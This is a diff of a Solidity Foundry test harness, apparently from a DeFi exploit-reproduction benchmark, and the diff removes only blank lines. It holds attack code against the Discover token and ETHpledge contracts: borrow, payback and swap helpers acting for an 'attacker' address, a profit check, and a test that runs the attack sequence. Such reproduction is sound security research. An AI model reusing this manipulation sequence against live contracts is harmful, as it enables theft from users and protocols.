@@ -5,7 +5,6 @@ import {BUSD} from "@utils/BUSD.sol";
 import {Discover} from "./contracts/Discover.sol";
 import {ETHpledge} from "./contracts/ETHpledge.sol";
 import {UniswapV2Pair} from "@uniswapv2/UniswapV2Pair.sol";
-
 contract DiscoverTestBase is Test, Helper {
     address busdholder = address(0x8894E0a0c962CB723c1976a4421c95949bE2D4E3);
     address attacker = address(0x06B912354B167848a4A608a56BC26C680DAD3D79);
@@ -21,11 +20,9 @@ contract DiscoverTestBase is Test, Helper {
     modifier foray() {
         _;
     }
-
     function setUp() public {
         balanceOfbusdattacker = busd.balanceOf(attacker);
     }
-
     function printBalance(string memory tips) public {
         emit log_string(tips);
         address[] memory token_addrs = new address[](2);
@@ -57,55 +54,45 @@ contract DiscoverTestBase is Test, Helper {
             user_names
         );
     }
-
     function attackGoal() public view returns (bool) {
         return busd.balanceOf(attacker) >= 1e18 + balanceOfbusdattacker;
     }
-
     function borrow_busd_pair(uint256 amount) internal foray {
         vm.stopPrank();
         vm.prank(address(pair));
         busd.transfer(attacker, amount);
         vm.startPrank(attacker);
     }
-
     function payback_busd_pair(uint256 amount) internal foray {
         busd.transfer(address(pair), amount);
     }
-
     function borrow_disc_pair(uint256 amount) internal foray {
         vm.stopPrank();
         vm.prank(address(pair));
         disc.transfer(attacker, amount);
         vm.startPrank(attacker);
     }
-
     function payback_disc_pair(uint256 amount) internal foray {
         disc.transfer(address(pair), amount);
     }
-
     function borrow_busd_busdholder(uint256 amount) internal foray {
         vm.stopPrank();
         vm.prank(address(busdholder));
         busd.transfer(attacker, amount);
         vm.startPrank(attacker);
     }
-
     function payback_busd_busdholder(uint256 amount) internal foray {
         busd.transfer(address(busdholder), amount);
     }
-
     function borrow_disc_busdholder(uint256 amount) internal foray {
         vm.stopPrank();
         vm.prank(address(busdholder));
         disc.transfer(attacker, amount);
         vm.startPrank(attacker);
     }
-
     function payback_disc_busdholder(uint256 amount) internal foray {
         disc.transfer(address(busdholder), amount);
     }
-
     function swap_pair_attacker_busd_disc(
         uint256 amount,
         uint256 amountOut
@@ -113,7 +100,6 @@ contract DiscoverTestBase is Test, Helper {
         busd.transfer(address(pair), amount);
         pair.swap(0, amountOut, attacker, new bytes(0));
     }
-
     function swap_pair_attacker_disc_busd(
         uint256 amount,
         uint256 amountOut
@@ -121,7 +107,6 @@ contract DiscoverTestBase is Test, Helper {
         disc.transfer(address(pair), amount);
         pair.swap(amountOut, 0, attacker, new bytes(0));
     }
-
     function swap_ethpledge_attacker_busd_disc(
         uint256 amount,
         uint256 amountOut
@@ -134,7 +119,6 @@ contract DiscoverTestBase is Test, Helper {
         vm.stopPrank();
         vm.startPrank(attacker);
     }
-
     function test_gt() public {
         vm.startPrank(attacker);
         borrow_busd_busdholder(2100e18);
@@ -159,7 +143,6 @@ contract DiscoverTestBase is Test, Helper {
         require(attackGoal(), "Attack failed!");
         vm.stopPrank();
     }
-
     function check_gt(
         uint256 amt0,
         uint256 amt1,
